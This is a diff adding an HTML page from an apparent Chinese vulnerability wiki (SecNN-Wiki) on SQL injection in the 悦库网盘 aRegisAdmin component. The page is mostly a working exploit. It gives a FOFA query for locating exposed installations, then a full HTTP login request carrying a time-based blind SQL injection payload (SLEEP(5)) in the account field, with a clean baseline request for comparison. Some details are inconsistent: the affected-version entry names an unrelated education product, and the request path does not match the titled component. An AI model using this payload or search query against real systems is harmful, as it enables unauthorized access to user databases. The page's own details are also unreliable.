@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%82%A6%E5%BA%93%E7%BD%91%E7%9B%98/%E6%82%A6%E5%BA%93%E7%BD%91%E7%9B%98aRegisAdmin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>悦库网盘aRegisAdmin存在SQL注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u60a6\u5e93\u7f51\u76d8aRegisAdmin\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        惠尔顿安全审计系统download任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98/%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98userlogin.html%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98/%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98userlogin.html%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        悦库企业网盘userlogin.html存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="aregisadminsql">悦库网盘aRegisAdmin存在SQL注入漏洞<a class="headerlink" href="#aregisadminsql" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>悦库网盘系统是一款功能强大的云存储平台，提供安全可靠的文件存储、共享和管理解决方案。该系统具有灵活的存储容量、文件同步、多终端访问等特性，支持跨平台的文件分享和团队协作。悦库网盘系统采用先进的加密技术确保数据安全，并提供了用户友好的界面和多样化的权限管理功能，满足个人用户、企业团队和教育机构的不同需求。悦库网盘aRegisAdmin存在SQL注入漏洞</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>企慧通教育系统</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>&lt;font style="color:rgb(51, 51, 51);"&gt;app=&lt;/font&gt;&lt;font style="color:rgb(221, 17, 68);"&gt;"悦库-悦库网盘"&lt;/font&gt;</code></li>
+</ul>
+<p><img alt="1718298354037-b753585e-1dcd-4e0b-8eec-1400ed166620.png" src="./img/WtGy-d6GGtrILpmK/1718298354037-b753585e-1dcd-4e0b-8eec-1400ed166620-817530.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">login</span><span class="o">/</span><span class="p">.</span><span class="na">html</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="mf">0.01</span>
+<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">125.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">windowWidth</span><span class="o">=</span><span class="mi">1036</span><span class="p">;</span><span class="w"> </span><span class="n">windowHeight</span><span class="o">=</span><span class="mi">846</span><span class="p">;</span><span class="w"> </span><span class="n">yid</span><span class="o">=</span><span class="mi">4</span><span class="n">m6jbq6mrd5mui6ul2gr3s9fl4</span><span class="p">;</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="n">zh</span><span class="o">-</span><span class="n">cn</span><span class="p">;</span><span class="w"> </span><span class="n">device</span><span class="o">=</span><span class="n">desktop</span><span class="p">;</span><span class="w"> </span><span class="n">theme</span><span class="o">=</span><span class="k">default</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">154</span>
+
+<span class="n">account</span><span class="o">=</span><span class="n">admin</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="p">(</span><span class="n">SELECT</span><span class="w"> </span><span class="mi">4215</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="p">(</span><span class="n">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">CFVi</span><span class="p">)</span><span class="o">--</span><span class="w"> </span><span class="n">WUij</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">8</span><span class="n">c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918</span><span class="o">&amp;</span><span class="n">clientId</span><span class="o">=</span><span class="mf">5E9</span><span class="n">B11EB90214398ADA353DF7F014E9C</span><span class="o">&amp;</span><span class="n">referer</span><span class="o">=&amp;</span><span class="n">keepLogin</span><span class="o">=</span><span class="kc">false</span>
+</code></pre></div>
+<p><img alt="1718298437044-3bce6637-6009-4b59-b1e6-66eb178f5df4.png" src="./img/WtGy-d6GGtrILpmK/1718298437044-3bce6637-6009-4b59-b1e6-66eb178f5df4-331145.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">login</span><span class="o">/</span><span class="p">.</span><span class="na">html</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="mf">0.01</span>
+<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">125.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">windowWidth</span><span class="o">=</span><span class="mi">1036</span><span class="p">;</span><span class="w"> </span><span class="n">windowHeight</span><span class="o">=</span><span class="mi">846</span><span class="p">;</span><span class="w"> </span><span class="n">yid</span><span class="o">=</span><span class="mi">4</span><span class="n">m6jbq6mrd5mui6ul2gr3s9fl4</span><span class="p">;</span><span class="w"> </span><span class="n">lang</span><span class="o">=</span><span class="n">zh</span><span class="o">-</span><span class="n">cn</span><span class="p">;</span><span class="w"> </span><span class="n">device</span><span class="o">=</span><span class="n">desktop</span><span class="p">;</span><span class="w"> </span><span class="n">theme</span><span class="o">=</span><span class="k">default</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">154</span>
+
+<span class="n">account</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="mi">8</span><span class="n">c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918</span><span class="o">&amp;</span><span class="n">clientId</span><span class="o">=</span><span class="mf">5E9</span><span class="n">B11EB90214398ADA353DF7F014E9C</span><span class="o">&amp;</span><span class="n">referer</span><span class="o">=&amp;</span><span class="n">keepLogin</span><span class="o">=</span><span class="kc">false</span>
+</code></pre></div>
+<p><img alt="1718298399701-682e6608-1c88-42b2-8c9e-60bfd0a3b5a3.png" src="./img/WtGy-d6GGtrILpmK/1718298399701-682e6608-1c88-42b2-8c9e-60bfd0a3b5a3-686633.png" /></p>
+<blockquote>
+<p>更新: 2024-06-17 09:34:03<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/iqb1350wkn2bu5qd">https://www.yuque.com/xiaokp7/ocvun2/iqb1350wkn2bu5qd</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E6%83%A0%E5%B0%94%E9%A1%BF/%E6%83%A0%E5%B0%94%E9%A1%BF%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9Fdownload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        惠尔顿安全审计系统download任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98/%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98userlogin.html%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98/%E6%82%A6%E5%BA%93%E4%BC%81%E4%B8%9A%E7%BD%91%E7%9B%98userlogin.html%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        悦库企业网盘userlogin.html存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
